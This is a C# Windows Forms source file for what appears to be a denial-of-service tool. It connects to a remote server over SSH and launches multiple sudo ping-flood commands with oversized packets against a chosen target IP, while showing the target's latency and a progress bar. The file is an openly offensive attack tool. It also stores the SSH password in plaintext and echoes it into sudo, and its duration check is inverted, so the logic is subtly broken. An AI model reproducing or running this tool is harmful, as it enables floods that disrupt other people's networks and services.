using Newtonsoft.Json;
using Renci.SshNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Timer = System.Windows.Forms.Timer;

namespace OFFINERY
{
    public partial class mainForm : Form
    {
        public bool isHitting = false;
        public mainForm()
        {
            InitializeComponent();
            InitTimer();
            if (File.Exists("config.json"))
            {
                string text = File.ReadAllText("config.json");
                serverinfo s = JsonConvert.DeserializeObject<serverinfo>(text);
                serveripBox.Text = s.IP;
                usernameBox.Text = s.User;
                passwordBox.Text = s.Pass;
            }
        }

        private void groupBox3_Enter(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private Timer timer1;
        public void InitTimer()
        {
            timer1 = new Timer();
            timer1.Tick += new EventHandler(timer1_Tick);
            timer1.Interval = 1000;
            timer1.Start();
        }

        int curTime = 0;
        private void timer1_Tick(object sender, EventArgs e)
        {
            if (isHitting)
            {
                curTime += 1;
                progress.Value = curTime;
                if (curTime >= durationBox.Value)
                {
                    attackButton.Enabled = true;
                    isHitting = false;
                    MessageBox.Show("Packet Barrage Complete!");
                    curlatency.Text = "Target Latency: None";
                    curtarget.Text = "Current Target: None";
                    progress.Value = 0;
                }
                else
                {
                    curlatency.Text = "Target Latency: " + GetPing(targetipBox.Text);
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (!(durationBox.Value >= 1))
            {
                curtarget.Text = "Current Target: " + targetipBox.Text;
                progress.Value = 0;
                progress.Maximum = (int)durationBox.Value;
                attackButton.Enabled = false;
                isHitting = true;
                string command = "";
                for (int i = 0; i < powerBox.Value; i++)
                {
                    command += string.Format("echo {0} | sudo -S timeout {1} ping -f -s 65500 -l 3 {2} &", passwordBox.Text, durationBox.Value, targetipBox.Text);
                }
                new Thread(() =>
                {
                    using (var client = new SshClient(serveripBox.Text, usernameBox.Text, passwordBox.Text))
                    {
                        client.Connect();
                        client.RunCommand(command);
                        client.Disconnect();
                    }
                }
                ).Start();
            } else
            {
                MessageBox.Show("Please set duration greater then 1!");
            }
        }

        private void durationBox_ValueChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            serverinfo info = new serverinfo();
            info.IP = serveripBox.Text;
            info.User = usernameBox.Text;
            info.Pass = passwordBox.Text;

            string json = JsonConvert.SerializeObject(info);

            System.IO.File.WriteAllText("config.json", json);
        }

        public class serverinfo
        {
            public string IP;
            public string User;
            public string Pass;
        }

        private void groupBox5_Enter(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        public static string GetPing(string address)
        {
            try
            {
                Ping myPing = new Ping();
                PingReply reply = myPing.Send(address);
                if (reply != null)
                {
                    return reply.RoundtripTime.ToString() + "ms";
                }
            }
            catch
            {
                return "Timed Out";
            }
            return null;
        }
    }
}
